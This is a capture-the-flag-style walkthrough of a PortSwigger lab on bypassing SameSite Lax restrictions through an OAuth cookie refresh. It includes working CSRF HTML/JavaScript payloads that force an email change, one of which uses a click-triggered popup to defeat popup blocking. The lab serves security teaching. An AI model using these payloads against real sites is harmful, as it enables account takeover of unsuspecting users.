## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/f367a510-be16-45db-ada1-ca97047282d0)

## Solution :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/df4a28e4-e124-44bc-9e83-550ec6340fe2)


Log in using the given username and password, the page will take us to a social media page for loggin in.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/3ad79edf-3f92-478d-80ca-30e903b17200)

Submit a update email request with some random email id.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/319a2790-3f77-40dd-a7b4-ef4d49c5854f)

The email update `POST` request doesn't have any unpredictable tokens.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/e7bebe28-ede1-4f4c-a9e0-4a908f6b5259)

Use the following script in the body section of the exploit server for a basic CSRF attack

```Javascript
<script>
    history.pushState('', '', '/')
</script>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="foo@bar.com" />
    <input type="submit" value="Submit request" />
</form>
<script>
    document.forms[0].submit();
</script>
```

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/a7e66e97-60a2-4d23-a374-d204f3bc1213)

The email has been changed to the one we specified.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/8c2b0285-a916-48e4-9d54-6e4770cb90b5)

The `GET /oauth-callback?code=[...]` request at the end of the OAuth flow doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/acdff665-726a-4da6-acf6-5e7cf0a75799)

`/social-login` is the one that automatically initiates the full OAuth flow.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/b71be57d-9f57-4eb4-945f-cb76671d1078)

Use the following script in the body of the exploit server for causing an email change request.

```Javascript
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="faked@web-security-academy.net">
</form>
<script>
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/3a140290-68df-4c68-ba8f-85bb0a4cbcfd)

The initial request is blocked as a popup.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/2bed33c3-7be1-4322-871b-af2ec4f35896)

Even though the pop-up was blocked the CSRF attack still works.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/59f9405f-9c63-4ba2-9f5e-19ae9a30be4a)

The pop-up was blocked because there is no interaction with the page. Use the following script in the body of the exploit server which will enable an interaction with the webpage.

```Javascript
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pranked@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

Delivering the it to the victim will finish the lab and cause the CSRF attack
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/4d154309-beb9-47a5-83b5-97f2bb442857)

When inspecting the `POST /my-account/change-email` we can see a new session cookie has been created.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/89e4859b-3300-42b1-bba0-c5551f0a9ddc)

Deliver the exploit to the victim to solve the lab

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/c1a03235-0cb4-4e64-bbe2-f5a3c364a5dc)

